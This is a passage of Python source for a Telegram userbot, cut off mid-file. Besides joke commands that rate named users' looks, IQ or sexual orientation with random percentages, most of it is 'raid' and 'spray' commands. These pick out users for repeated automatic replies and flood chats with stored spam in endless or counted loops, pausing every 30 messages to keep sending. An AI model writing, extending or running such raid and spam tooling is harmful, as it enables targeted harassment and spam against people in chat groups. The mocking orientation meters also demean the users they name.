        @register_cmd("studmeter")
        async def cmd_studmeter(event, arg):
            target = await get_targets(event, arg)
            if not target:
                return await safe_edit(event, "❌ Reply to a user or provide username.")
            uid = next(iter(target))
            try:
                user = await user_bot.get_entity(uid)
                name = user.first_name or str(uid)
                percent = random.randint(0, 100)
                msg = f"📊 **Stud Meter for {name}**\n\n💪 Stud Level: {percent}%\n"
                if percent >= 90:
                    msg += "🔥 You're a legend! 💪"
                elif percent >= 70:
                    msg += "🌟 Pretty studly! 😎"
                elif percent >= 50:
                    msg += "👍 Not bad, keep it up!"
                else:
                    msg += "😅 Maybe try some gym? 😂"
                await safe_edit(event, msg)
            except:
                await safe_edit(event, "❌ User not found.")

        @register_cmd("looks")
        async def cmd_looks(event, arg):
            target = await get_targets(event, arg)
            if not target:
                return await safe_edit(event, "❌ Reply to a user or provide username.")
            uid = next(iter(target))
            try:
                user = await user_bot.get_entity(uid)
                name = user.first_name or str(uid)
                percent = random.randint(0, 100)
                msg = f"👀 **Looks Meter for {name}**\n\n🌟 Looks: {percent}%\n"
                if percent >= 90:
                    msg += "💖 You're a masterpiece! 😍"
                elif percent >= 70:
                    msg += "💕 Very attractive! 😊"
                elif percent >= 50:
                    msg += "😐 Average, but charming!"
                else:
                    msg += "😬 Maybe try a new style? 😅"
                await safe_edit(event, msg)
            except:
                await safe_edit(event, "❌ User not found.")

        @register_cmd("gay")
        async def cmd_gay(event, arg):
            target = await get_targets(event, arg)
            if not target:
                return await safe_edit(event, "❌ Reply to a user or provide username.")
            uid = next(iter(target))
            try:
                user = await user_bot.get_entity(uid)
                name = user.first_name or str(uid)
                percent = random.randint(0, 100)
                msg = f"🏳️‍🌈 **Gay Percentage for {name}**\n\n🌈 Gayness: {percent}%\n"
                if percent >= 90:
                    msg += "🏳️‍🌈🌈 Totally gay! 😂"
                elif percent >= 70:
                    msg += "🌈 Pretty gay! 😏"
                elif percent >= 50:
                    msg += "🤔 Half and half!"
                else:
                    msg += "💪 Straight as an arrow!"
                await safe_edit(event, msg)
            except:
                await safe_edit(event, "❌ User not found.")

        @register_cmd("lesbian")
        async def cmd_lesbian(event, arg):
            target = await get_targets(event, arg)
            if not target:
                return await safe_edit(event, "❌ Reply to a user or provide username.")
            uid = next(iter(target))
            try:
                user = await user_bot.get_entity(uid)
                name = user.first_name or str(uid)
                percent = random.randint(0, 100)
                msg = f"👩‍❤️‍👩 **Lesbian Percentage for {name}**\n\n💖 Lesbianness: {percent}%\n"
                if percent >= 90:
                    msg += "👩‍❤️‍💋‍👩 Total lesbian! 😍"
                elif percent >= 70:
                    msg += "💕 Very gay! 😊"
                elif percent >= 50:
                    msg += "🤷‍♀️ Could go either way!"
                else:
                    msg += "💁‍♀️ Straight as a ruler!"
                await safe_edit(event, msg)
            except:
                await safe_edit(event, "❌ User not found.")

        @register_cmd("straight")
        async def cmd_straight(event, arg):
            target = await get_targets(event, arg)
            if not target:
                return await safe_edit(event, "❌ Reply to a user or provide username.")
            uid = next(iter(target))
            try:
                user = await user_bot.get_entity(uid)
                name = user.first_name or str(uid)
                percent = random.randint(0, 100)
                msg = f"💪 **Straight Percentage for {name}**\n\n📏 Straightness: {percent}%\n"
                if percent >= 90:
                    msg += "🏆 Straight as a ruler! 📏"
                elif percent >= 70:
                    msg += "😎 Pretty straight! 😏"
                elif percent >= 50:
                    msg += "🤷 Could be flexible!"
                else:
                    msg += "🌈 Maybe try exploring? 😉"
                await safe_edit(event, msg)
            except:
                await safe_edit(event, "❌ User not found.")

        @register_cmd("bi")
        async def cmd_bi(event, arg):
            target = await get_targets(event, arg)
            if not target:
                return await safe_edit(event, "❌ Reply to a user or provide username.")
            uid = next(iter(target))
            try:
                user = await user_bot.get_entity(uid)
                name = user.first_name or str(uid)
                percent = random.randint(0, 100)
                msg = f"💜 **Bi Percentage for {name}**\n\n💕 Bisexuality: {percent}%\n"
                if percent >= 90:
                    msg += "💜💙 Totally bi! 😍"
                elif percent >= 70:
                    msg += "💕 Quite bi-curious! 😏"
                elif percent >= 50:
                    msg += "🤷‍♂️ Could go both ways!"
                else:
                    msg += "💁 Mostly straight!"
                await safe_edit(event, msg)
            except:
                await safe_edit(event, "❌ User not found.")

        @register_cmd("trans")
        async def cmd_trans(event, arg):
            target = await get_targets(event, arg)
            if not target:
                return await safe_edit(event, "❌ Reply to a user or provide username.")
            uid = next(iter(target))
            try:
                user = await user_bot.get_entity(uid)
                name = user.first_name or str(uid)
                percent = random.randint(0, 100)
                msg = f"🏳️‍⚧️ **Trans Pride for {name}**\n\n💖 Transness: {percent}%\n"
                if percent >= 90:
                    msg += "🌟 You're a beautiful soul! 💕"
                elif percent >= 70:
                    msg += "💜 Very strong! 😊"
                elif percent >= 50:
                    msg += "🤔 Exploring your identity?"
                else:
                    msg += "💁 You're you, that's enough!"
                await safe_edit(event, msg)
            except:
                await safe_edit(event, "❌ User not found.")

        @register_cmd("simp")
        async def cmd_simp(event, arg):
            target = await get_targets(event, arg)
            if not target:
                return await safe_edit(event, "❌ Reply to a user or provide username.")
            uid = next(iter(target))
            try:
                user = await user_bot.get_entity(uid)
                name = user.first_name or str(uid)
                percent = random.randint(0, 100)
                msg = f"🫠 **Simp Meter for {name}**\n\n😩 Simp Level: {percent}%\n"
                if percent >= 90:
                    msg += "💀 Ultimate Simp! 😂"
                elif percent >= 70:
                    msg += "💔 Down bad! 😭"
                elif percent >= 50:
                    msg += "😅 Slightly simping!"
                else:
                    msg += "👑 You're a chad! 😎"
                await safe_edit(event, msg)
            except:
                await safe_edit(event, "❌ User not found.")

        @register_cmd("chad")
        async def cmd_chad(event, arg):
            target = await get_targets(event, arg)
            if not target:
                return await safe_edit(event, "❌ Reply to a user or provide username.")
            uid = next(iter(target))
            try:
                user = await user_bot.get_entity(uid)
                name = user.first_name or str(uid)
                percent = random.randint(0, 100)
                msg = f"🗿 **Chad Meter for {name}**\n\n💪 Chad Level: {percent}%\n"
                if percent >= 90:
                    msg += "🔥 Sigma Chad! 😎"
                elif percent >= 70:
                    msg += "💪 Pretty chad! 💪"
                elif percent >= 50:
                    msg += "🤷 Neutral vibes!"
                else:
                    msg += "🥶 Maybe a bit of a beta? 😉"
                await safe_edit(event, msg)
            except:
                await safe_edit(event, "❌ User not found.")

        @register_cmd("friendly")
        async def cmd_friendly(event, arg):
            target = await get_targets(event, arg)
            if not target:
                return await safe_edit(event, "❌ Reply to a user or provide username.")
            uid = next(iter(target))
            try:
                user = await user_bot.get_entity(uid)
                name = user.first_name or str(uid)
                percent = random.randint(0, 100)
                msg = f"🤗 **Friendliness Meter for {name}**\n\n😊 Friendly: {percent}%\n"
                if percent >= 90:
                    msg += "🌈 You're a ray of sunshine! ☀️"
                elif percent >= 70:
                    msg += "💖 Very approachable! 😊"
                elif percent >= 50:
                    msg += "😐 Pretty neutral!"
                else:
                    msg += "😤 Maybe need to smile more?"
                await safe_edit(event, msg)
            except:
                await safe_edit(event, "❌ User not found.")

        @register_cmd("rizz")
        async def cmd_rizz(event, arg):
            target = await get_targets(event, arg)
            if not target:
                return await safe_edit(event, "❌ Reply to a user or provide username.")
            uid = next(iter(target))
            try:
                user = await user_bot.get_entity(uid)
                name = user.first_name or str(uid)
                percent = random.randint(0, 100)
                msg = f"💋 **Rizz Meter for {name}**\n\n🔥 Rizz Level: {percent}%\n"
                if percent >= 90:
                    msg += "🌹 Absolute rizz god! 😏"
                elif percent >= 70:
                    msg += "💕 Smooth talker! 😉"
                elif percent >= 50:
                    msg += "😅 Average rizz!"
                else:
                    msg += "🤡 Need some rizz lessons? 😂"
                await safe_edit(event, msg)
            except:
                await safe_edit(event, "❌ User not found.")

        @register_cmd("iq")
        async def cmd_iq(event, arg):
            target = await get_targets(event, arg)
            if not target:
                return await safe_edit(event, "❌ Reply to a user or provide username.")
            uid = next(iter(target))
            try:
                user = await user_bot.get_entity(uid)
                name = user.first_name or str(uid)
                score = random.randint(50, 200)
                msg = f"🧠 **IQ Score for {name}**\n\n📊 IQ: {score}\n"
                if score >= 180:
                    msg += "🌟 Genius level! 🤯"
                elif score >= 140:
                    msg += "💡 Very smart! 🧐"
                elif score >= 100:
                    msg += "👍 Average, keep learning!"
                else:
                    msg += "😬 Maybe read a book? 😅"
                await safe_edit(event, msg)
            except:
                await safe_edit(event, "❌ User not found.")

        # ─── BESTFRIEND, MARRIAGE, DIVORCE ───
        @register_cmd("bestfrnd")
        async def cmd_bestfrnd(event, arg):
            target = await get_targets(event, arg)
            if not target:
                return await safe_edit(event, "❌ Reply to a user or provide username.")
            uid = next(iter(target))
            try:
                requester = await user_bot.get_me()
                requester_name = requester.first_name or "Someone"
                target_user = await user_bot.get_entity(uid)
                target_name = target_user.first_name or "Unknown"

                shayari = random.choice(BESTFRIEND_SHAYARI)
                final_msg = f"{shayari}\n\n**From:** {requester_name}\n**To:** {target_name}"
                buttons = [
                    [types.KeyboardButtonCallback("💖 Haan, zaroor!", f"bestfrnd_yes_{uid}_{event.sender_id}")],
                    [types.KeyboardButtonCallback("💔 Nahi, sorry!", f"bestfrnd_no_{uid}_{event.sender_id}")]
                ]
                await event.delete()
                await user_bot.send_message(event.chat_id, final_msg, buttons=buttons)
            except:
                await safe_edit(event, "❌ User not found.")

        @register_cmd("marriage")
        async def cmd_marriage(event, arg):
            target = await get_targets(event, arg)
            if not target:
                return await safe_edit(event, "❌ Reply to a user or provide username.")
            uid = next(iter(target))
            try:
                requester = await user_bot.get_me()
                requester_name = requester.first_name or "Someone"
                target_user = await user_bot.get_entity(uid)
                target_name = target_user.first_name or "Unknown"

                shayari = random.choice(MARRIAGE_SHAYARI)
                final_msg = f"{shayari}\n\n**From:** {requester_name}\n**To:** {target_name}"
                buttons = [
                    [types.KeyboardButtonCallback("💍 Yes", f"marriage_yes_{uid}_{event.sender_id}")],
                    [types.KeyboardButtonCallback("💔 No", f"marriage_no_{uid}_{event.sender_id}")]
                ]
                await event.delete()
                await user_bot.send_message(event.chat_id, final_msg, buttons=buttons)
            except:
                await safe_edit(event, "❌ User not found.")

        @register_cmd("divorce")
        async def cmd_divorce(event, arg):
            target = await get_targets(event, arg)
            if not target:
                return await safe_edit(event, "❌ Reply to a user or provide username.")
            uid = next(iter(target))
            try:
                requester = await user_bot.get_me()
                requester_name = requester.first_name or "Someone"
                target_user = await user_bot.get_entity(uid)
                target_name = target_user.first_name or "Unknown"

                shayari = random.choice(DIVORCE_SHAYARI)
                final_msg = f"{shayari}\n\n**From:** {requester_name}\n**To:** {target_name}"
                buttons = [
                    [types.KeyboardButtonCallback("💔 Yes", f"divorce_yes_{uid}_{event.sender_id}")],
                    [types.KeyboardButtonCallback("💖 No, let's stay", f"divorce_no_{uid}_{event.sender_id}")]
                ]
                await event.delete()
                await user_bot.send_message(event.chat_id, final_msg, buttons=buttons)
            except:
                await safe_edit(event, "❌ User not found.")

        # ─── CALLBACK HANDLER ───
        @user_bot.on(events.CallbackQuery)
        async def userbot_callback(event):
            data = event.data.decode()
            clicker_id = event.sender_id
            parts = data.split("_")
            if len(parts) < 4:
                return await event.answer("Invalid request.", alert=True)
            action = parts[0]
            target_id = int(parts[2])
            requester_id = int(parts[3])
            if clicker_id != target_id:
                await event.answer("❌ This question is not for you!", alert=True)
                return
            try:
                target = await user_bot.get_entity(target_id)
                target_name = target.first_name or str(target_id)
                requester = await user_bot.get_entity(requester_id)
                requester_name = requester.first_name or str(requester_id)
                if action == "bestfrnd_yes":
                    await event.edit(f"💖 **{target_name}** said **YES** to be best friend with **{requester_name}**! 🎉\n\nDosti zindabad! 🤗")
                    await event.answer("You accepted! 💖", alert=True)
                elif action == "bestfrnd_no":
                    await event.edit(f"💔 **{target_name}** said **NO** to be best friend with **{requester_name}**. 😢\n\nMaybe next time! 💔")
                    await event.answer("You declined! 💔", alert=True)
                elif action == "divorce_yes":
                    await event.edit(f"💔 **{target_name}** said **YES** to divorce from **{requester_name}**. 😢\n\nIt's over. 💔")
                    await event.answer("Divorce accepted! 💔", alert=True)
                elif action == "divorce_no":
                    await event.edit(f"💖 **{target_name}** said **NO** to divorce from **{requester_name}**. ❤️\n\nLove wins! 💕")
                    await event.answer("Divorce rejected! ❤️", alert=True)
                elif action == "marriage_yes":
                    await event.edit(f"💍 **{target_name}** said **YES** to marry **{requester_name}**! 🎉\n\nCongratulations! 💕💍")
                    await event.answer("Marriage accepted! 🎉", alert=True)
                elif action == "marriage_no":
                    await event.edit(f"💔 **{target_name}** said **NO** to marry **{requester_name}**. 😢\n\nMaybe next time! 💔")
                    await event.answer("Marriage rejected! 💔", alert=True)
            except Exception as e:
                await event.edit("❌ Error processing your request.")
                print(f"Callback error: {e}")

        # ─── RAID COMMANDS ───
        @register_cmd("reply", needs_reply=True)
        async def cmd_reply(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            added, already = [], []
            for uid in targets:
                if uid in user_bot.reply_users:
                    already.append(str(uid))
                else:
                    user_bot.reply_users.add(uid); added.append(str(uid))
            msg = ""
            if added: msg += f"🔥 Reply raid on: {', '.join(added)}\n"
            if already: msg += f"⚠️ Already active: {', '.join(already)}"
            if not msg: msg = "❌ No changes"
            await safe_edit(event, msg)

        @register_cmd("sreply")
        async def cmd_sreply(event, arg):
            targets = await get_targets(event, arg)
            if targets:
                removed, not_active = [], []
                for uid in targets:
                    if uid in user_bot.reply_users:
                        user_bot.reply_users.discard(uid); removed.append(str(uid))
                    else:
                        not_active.append(str(uid))
                msg = ""
                if removed: msg += f"🛑 Removed: {', '.join(removed)}\n"
                if not_active: msg += f"⚠️ Not active: {', '.join(not_active)}"
                if not msg: msg = "❌ No changes"
                await safe_edit(event, msg)
            else:
                user_bot.reply_users.clear()
                await safe_edit(event, "🛑 Reply raid stopped for all")

        @register_cmd("rr", needs_reply=True)
        async def cmd_rr(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            added, already = [], []
            for uid in targets:
                if uid in user_bot.rr_users:
                    already.append(str(uid))
                else:
                    user_bot.rr_users.add(uid); added.append(str(uid))
            msg = ""
            if added: msg += f"🔥 RR on: {', '.join(added)}\n"
            if already: msg += f"⚠️ Already: {', '.join(already)}"
            if not msg: msg = "❌ No changes"
            await safe_edit(event, msg)

        @register_cmd("srr")
        async def cmd_srr(event, arg):
            targets = await get_targets(event, arg)
            if targets:
                removed, not_active = [], []
                for uid in targets:
                    if uid in user_bot.rr_users:
                        user_bot.rr_users.discard(uid); removed.append(str(uid))
                    else:
                        not_active.append(str(uid))
                msg = ""
                if removed: msg += f"🛑 Removed: {', '.join(removed)}\n"
                if not_active: msg += f"⚠️ Not active: {', '.join(not_active)}"
                if not msg: msg = "❌ No changes"
                await safe_edit(event, msg)
            else:
                user_bot.rr_users.clear()
                await safe_edit(event, "🛑 RR stopped for all")

        @register_cmd("flag", needs_reply=True)
        async def cmd_flag(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            added, already = [], []
            for uid in targets:
                if uid in user_bot.flag_users:
                    already.append(str(uid))
                else:
                    user_bot.flag_users.add(uid); added.append(str(uid))
            msg = ""
            if added: msg += f"🌊 Flag on: {', '.join(added)}\n"
            if already: msg += f"⚠️ Already: {', '.join(already)}"
            if not msg: msg = "❌ No changes"
            await safe_edit(event, msg)

        @register_cmd("sflag")
        async def cmd_sflag(event, arg):
            targets = await get_targets(event, arg)
            if targets:
                removed, not_active = [], []
                for uid in targets:
                    if uid in user_bot.flag_users:
                        user_bot.flag_users.discard(uid); removed.append(str(uid))
                    else:
                        not_active.append(str(uid))
                msg = ""
                if removed: msg += f"🛑 Removed: {', '.join(removed)}\n"
                if not_active: msg += f"⚠️ Not active: {', '.join(not_active)}"
                if not msg: msg = "❌ No changes"
                await safe_edit(event, msg)
            else:
                user_bot.flag_users.clear()
                await safe_edit(event, "🛑 Flag stopped for all")

        @register_cmd("hrr", needs_reply=True)
        async def cmd_hrr(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            added, already = [], []
            for uid in targets:
                if uid in user_bot.hrr_users:
                    already.append(str(uid))
                else:
                    user_bot.hrr_users.add(uid); added.append(str(uid))
            msg = ""
            if added: msg += f"💜 Heart on: {', '.join(added)}\n"
            if already: msg += f"⚠️ Already: {', '.join(already)}"
            if not msg: msg = "❌ No changes"
            await safe_edit(event, msg)

        @register_cmd("shrr")
        async def cmd_shrr(event, arg):
            targets = await get_targets(event, arg)
            if targets:
                removed, not_active = [], []
                for uid in targets:
                    if uid in user_bot.hrr_users:
                        user_bot.hrr_users.discard(uid); removed.append(str(uid))
                    else:
                        not_active.append(str(uid))
                msg = ""
                if removed: msg += f"🛑 Removed: {', '.join(removed)}\n"
                if not_active: msg += f"⚠️ Not active: {', '.join(not_active)}"
                if not msg: msg = "❌ No changes"
                await safe_edit(event, msg)
            else:
                user_bot.hrr_users.clear()
                await safe_edit(event, "🛑 Heart stopped for all")

        @register_cmd("replygod", needs_reply=True)
        async def cmd_replygod(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            added, already = [], []
            for uid in targets:
                if uid in user_bot.replygod_users:
                    already.append(str(uid))
                else:
                    user_bot.replygod_users.add(uid); added.append(str(uid))
            msg = ""
            if added: msg += f"💥 God on: {', '.join(added)}\n"
            if already: msg += f"⚠️ Already: {', '.join(already)}"
            if not msg: msg = "❌ No changes"
            await safe_edit(event, msg)

        @register_cmd("sgod")
        async def cmd_sgod(event, arg):
            targets = await get_targets(event, arg)
            if targets:
                removed, not_active = [], []
                for uid in targets:
                    if uid in user_bot.replygod_users:
                        user_bot.replygod_users.discard(uid); removed.append(str(uid))
                    else:
                        not_active.append(str(uid))
                msg = ""
                if removed: msg += f"🛑 Removed: {', '.join(removed)}\n"
                if not_active: msg += f"⚠️ Not active: {', '.join(not_active)}"
                if not msg: msg = "❌ No changes"
                await safe_edit(event, msg)
            else:
                user_bot.replygod_users.clear()
                await safe_edit(event, "🛑 God stopped for all")

        @register_cmd("customraid", needs_reply=True)
        async def cmd_customraid(event, arg):
            if not arg or len(arg.split()) < 2:
                return await safe_edit(event, "❌ Usage: .customraid <text> <count> (reply to user)")
            text, count = arg.rsplit(" ", 1)
            try:
                count = int(count)
                if count < 1: count = 1
                if count > 100: count = 100
            except:
                return await safe_edit(event, "❌ Count must be a number")
            targets = await get_targets(event, "")
            if not targets:
                return await safe_edit(event, "❌ No target (reply to user or mention)")
            added, overridden = [], []
            for uid in targets:
                if uid in user_bot.custom_raid_users:
                    overridden.append(str(uid))
                user_bot.custom_raid_users[uid] = {"text": text, "count": count}
                added.append(str(uid))
            msg = f"☄️ **Custom Raid started** on: {', '.join(added)} × {count} times"
            if overridden:
                msg += f"\n⚠️ Overridden: {', '.join(overridden)}"
            await safe_edit(event, msg)

        @register_cmd("stopcustomraid")
        async def cmd_stopcustomraid(event, arg):
            targets = await get_targets(event, arg)
            if targets:
                removed, not_active = [], []
                for uid in targets:
                    if uid in user_bot.custom_raid_users:
                        del user_bot.custom_raid_users[uid]
                        removed.append(str(uid))
                    else:
                        not_active.append(str(uid))
                msg = ""
                if removed: msg += f"🛑 Removed: {', '.join(removed)}\n"
                if not_active: msg += f"⚠️ Not active: {', '.join(not_active)}"
                if not msg: msg = "❌ No changes"
                await safe_edit(event, msg)
            else:
                user_bot.custom_raid_users.clear()
                await safe_edit(event, "🛑 All Custom Raids stopped")

        # ─── SPAM COMMANDS ───
        @register_cmd("spray")
        async def cmd_spray(event, arg):
            if not arg:
                return await safe_edit(event, "❌ Usage: .spray <text>")
            chat = event.chat_id
            if chat in user_bot.spray_tasks and not user_bot.spray_tasks[chat].done():
                return await safe_edit(event, "⚠️ Already spraying")
            await safe_edit(event, "⚡ Spray starting...")
            async def loop():
                sent = 0
                try:
                    while chat in user_bot.spray_tasks:
                        await safe_send(chat, arg)
                        sent += 1
                        if sent % 30 == 0:
                            await asyncio.sleep(3)
                        await asyncio.sleep(user_bot.SPRAY_DELAY)
                except asyncio.CancelledError:
                    pass
                finally:
                    user_bot.spray_tasks.pop(chat, None)
            user_bot.spray_tasks[chat] = asyncio.create_task(loop())
            await safe_edit(event, f"💣 Spray started: {arg[:40]}")

        @register_cmd("dspray")
        async def cmd_dspray(event, _):
            chat = event.chat_id
            if chat not in user_bot.spray_tasks:
                return await safe_edit(event, "⚠️ No active spray")
            try:
                user_bot.spray_tasks[chat].cancel()
            except:
                pass
            user_bot.spray_tasks.pop(chat, None)
            await safe_edit(event, "🛑 Spray stopped")

        @register_cmd("listtexts")
        async def cmd_listtexts(event, _):
            if not user_bot.spam_texts:
                return await safe_edit(event, "📭 No texts saved.\n\nUse `.addtext <text>` (owner only) to add one.")
            msg = "📋 Saved Spam Texts (Common):\n\n"
            for i, t in enumerate(user_bot.spam_texts, 1):
                preview = t[:50].replace("`", "'")
                msg += f"**{i}.** `{preview}`{'…' if len(t) > 50 else ''}\n"
            msg += f"\n💡 `.tspray <number>` to spam that specific text."
            await safe_edit(event, msg)

        @register_cmd("addtext")
        async def cmd_addtext(event, arg):
            if event.sender_id not in OWNER_IDS:
                return await safe_edit(event, "❌ Owner only command.")
            if not arg:
                return await safe_edit(event, "❌ Usage: .addtext <text>")
            user_bot.spam_texts.append(arg.strip())
            save_common_spam()
            await safe_edit(event, f"✅ Text added! Slot `{len(user_bot.spam_texts)}`")

        @register_cmd("edittext")
        async def cmd_edittext(event, arg):
            if event.sender_id not in OWNER_IDS:
                return await safe_edit(event, "❌ Owner only command.")
            parts = arg.split(None, 1) if arg else []
            if len(parts) < 2 or not parts[0].isdigit():
                return await safe_edit(event, "❌ Usage: .edittext <number> <new text>")
            idx = int(parts[0]) - 1
            if idx < 0 or idx >= len(user_bot.spam_texts):
                return await safe_edit(event, f"❌ Invalid slot. Total: {len(user_bot.spam_texts)}")
            old = user_bot.spam_texts[idx]
            user_bot.spam_texts[idx] = parts[1]
            save_common_spam()
            await safe_edit(event, f"✏️ Edited slot {idx+1}:\n`{old}` → `{parts[1]}`")

        @register_cmd("deltext")
        async def cmd_deltext(event, arg):
            if event.sender_id not in OWNER_IDS:
                return await safe_edit(event, "❌ Owner only command.")
            if not arg or not arg.isdigit():
                return await safe_edit(event, "❌ Usage: .deltext <number>")
            idx = int(arg) - 1
            if idx < 0 or idx >= len(user_bot.spam_texts):
                return await safe_edit(event, f"❌ Invalid slot. Total: {len(user_bot.spam_texts)}")
            removed = user_bot.spam_texts.pop(idx)
            save_common_spam()
            await safe_edit(event, f"🗑️ Deleted slot {idx+1}: `{removed[:40]}`")

        @register_cmd("cleartext")
        async def cmd_cleartext(event, arg):
            if event.sender_id not in OWNER_IDS:
                return await safe_edit(event, "❌ Owner only command.")
            if arg.strip().lower() != "confirm":
                return await safe_edit(event, f"⚠️ Type `.cleartext confirm` to delete all {len(user_bot.spam_texts)} texts.")
            count = len(user_bot.spam_texts)
            user_bot.spam_texts.clear()
            save_common_spam()
            await safe_edit(event, f"🗑️ Cleared {count} texts.")

        @register_cmd("tspray")
        async def cmd_tspray(event, arg):
            if not arg or not arg.isdigit():
                return await safe_edit(event, "❌ Usage: .tspray <slot_number>")
            idx = int(arg) - 1
            if idx < 0 or idx >= len(user_bot.spam_texts):
                return await safe_edit(event, f"❌ Invalid slot. Total: {len(user_bot.spam_texts)}")
            text = user_bot.spam_texts[idx]
            chat = event.chat_id
            if chat in user_bot.spray_tasks and not user_bot.spray_tasks[chat].done():
                return await safe_edit(event, "⚠️ Already spraying")
            await safe_edit(event, f"⚡ TSpray starting slot {idx+1}...")
            async def loop():
                sent = 0
                try:
                    while chat in user_bot.spray_tasks:
                        await safe_send(chat, text)
                        sent += 1
                        if sent % 30 == 0:
                            await asyncio.sleep(3)
                        await asyncio.sleep(user_bot.SPRAY_DELAY)
                except asyncio.CancelledError:
                    pass
                finally:
                    user_bot.spray_tasks.pop(chat, None)
            user_bot.spray_tasks[chat] = asyncio.create_task(loop())
            await safe_edit(event, f"💣 TSpray started for slot {idx+1}")

        @register_cmd("rspray")
        async def cmd_rspray(event, _):
            if not user_bot.spam_texts:
                return await safe_edit(event, "📭 No texts saved.")
            chat = event.chat_id
            if chat in user_bot.spray_tasks and not user_bot.spray_tasks[chat].done():
                return await safe_edit(event, "⚠️ Already spraying")
            await safe_edit(event, "🎲 RSpray starting...")
            async def loop():
                sent = 0
                try:
                    while chat in user_bot.spray_tasks:
                        txt = random.choice(user_bot.spam_texts)
                        await safe_send(chat, txt)
                        sent += 1
                        if sent % 30 == 0:
                            await asyncio.sleep(3)
                        await asyncio.sleep(user_bot.SPRAY_DELAY)
                except asyncio.CancelledError:
                    pass
                finally:
                    user_bot.spray_tasks.pop(chat, None)
            user_bot.spray_tasks[chat] = asyncio.create_task(loop())
            await safe_edit(event, f"🎲 RSpray started (pool: {len(user_bot.spam_texts)})")

        @register_cmd("multispray")
        async def cmd_multispray(event, arg):
            if not user_bot.spam_texts:
                return await safe_edit(event, "📭 No texts saved.")
            count = None
            if arg and arg.strip().isdigit():
                count = int(arg.strip())
                if count < 1: count = 1
                if count > 1000: count = 1000
            chat = event.chat_id
            target_msg_id = None
            if event.is_reply:
                reply = await event.get_reply_message()
                if reply:
                    target_msg_id = reply.id
            if chat in user_bot.spray_tasks and not user_bot.spray_tasks[chat].done():
                return await safe_edit(event, "⚠️ Already spraying")
            await safe_edit(event, f"🔄 MultiSpray starting{' with reply' if target_msg_id else ''}..."
                                 f"{' (' + str(count) + ' msgs)' if count else ' (infinite)'}")
            async def loop():
                i = 0
                sent = 0
                try:
                    while chat in user_bot.spray_tasks:
                        if count is not None and sent >= count:
                            break
                        txt = user_bot.spam_texts[i % len(user_bot.spam_texts)]
                        i += 1
                        sent += 1
                        if target_msg_id:
                            await safe_send(chat, txt, reply_to=target_msg_id)
                        else:
                            await safe_send(chat, txt)
                        if sent % 30 == 0:
                            await asyncio.sleep(3)
                        await asyncio.sleep(user_bot.SPRAY_DELAY)
                except asyncio.CancelledError:
                    pass
                finally:
                    user_bot.spray_tasks.pop(chat, None)
                    if sent > 0:
                        await safe_send(chat, f"✅ MultiSpray done: {sent} messages sent.")
            user_bot.spray_tasks[chat] = asyncio.create_task(loop())
            await safe_edit(event, f"🔄 MultiSpray started (rotating {len(user_bot.spam_texts)})"
                                 + (" with reply" if target_msg_id else ""))

        @register_cmd("countspray")
        async def cmd_countspray(event, arg):
            parts = arg.split(None, 1) if arg else []
            if len(parts) < 2 or not parts[0].isdigit():
                return await safe_edit(event, "❌ Usage: .countspray <count> <text>")
            count = int(parts[0])
            if count < 1 or count > 500:
                return await safe_edit(event, "❌ Count must be 1-500")
            text = parts[1]
            chat = event.chat_id
            if chat in user_bot.spray_tasks and not user_bot.spray_tasks[chat].done():
                return await safe_edit(event, "⚠️ Already spraying")
            await safe_edit(event, f"🎯 CountSpray starting ({count} messages)...")
            async def loop():
                sent = 0
                try:
                    while sent < count and chat in user_bot.spray_tasks:
                        await safe_send(chat, text)
                        sent += 1
                        if sent % 30 == 0:
                            await asyncio.sleep(3)
                        await asyncio.sleep(user_bot.SPRAY_DELAY)
                except asyncio.CancelledError:
                    pass
                finally:
                    user_bot.spray_tasks.pop(chat, None)
                    if sent > 0:
                        await safe_send(chat, f"✅ Done! Sent {sent} messages.")
            user_bot.spray_tasks[chat] = asyncio.create_task(loop())
            await safe_edit(event, f"🎯 CountSpray started ({count} messages)")

        @register_cmd("spraydelay")
        async def cmd_spraydelay(event, arg):
            if event.sender_id not in OWNER_IDS:
                return await safe_edit(event, "❌ Owner only command.")
            if not arg:
                return await safe_edit(event, f"Current delay: {user_bot.SPRAY_DELAY}s")
            try:
                val = float(arg)
                if val < 0.1: val = 0.1
                if val > 60: val = 60
                old = user_bot.SPRAY_DELAY
                user_bot.SPRAY_DELAY = val
                await safe_edit(event, f"⚡ Delay updated: {old}s → {val}s")
            except:
                await safe_edit(event, "❌ Invalid number")

        # ─── MUTE COMMANDS ───
        @register_cmd("mute", needs_reply=True)
        async def cmd_mute(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            added, already = [], []
            for uid in targets:
                if uid in user_bot.muted_users:
                    already.append(str(uid))
                else:
                    user_bot.muted_users.add(uid); added.append(str(uid))
            msg = ""
            if added: msg += f"🔇 Muted: {', '.join(added)}\n"
            if already: msg += f"⚠️ Already muted: {', '.join(already)}"
            if not msg: msg = "❌ No changes"
            await safe_edit(event, msg)

        @register_cmd("unmute", needs_reply=True)
        async def cmd_unmute(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            removed, not_muted = [], []
            for uid in targets:
                if uid in user_bot.muted_users:
                    user_bot.muted_users.remove(uid); removed.append(str(uid))
                else:
                    not_muted.append(str(uid))
            msg = ""
            if removed: msg += f"🗣️ Unmuted: {', '.join(removed)}\n"
            if not_muted: msg += f"⚠️ Not muted: {', '.join(not_muted)}"
            if not msg: msg = "❌ No changes"
            await safe_edit(event, msg)

        @register_cmd("gmute", needs_reply=True)
        async def cmd_gmute(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            added, already = [], []
            for uid in targets:
                if uid in user_bot.global_muted:
                    already.append(str(uid))
                else:
                    user_bot.global_muted.add(uid); added.append(str(uid))
            msg = ""
            if added: msg += f"🔕 Gmuted: {', '.join(added)}\n"
            if already: msg += f"⚠️ Already gmuted: {', '.join(already)}"
            if not msg: msg = "❌ No changes"
            await safe_edit(event, msg)

        @register_cmd("gunmute", needs_reply=True)
        async def cmd_gunmute(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            removed, not_muted = [], []
            for uid in targets:
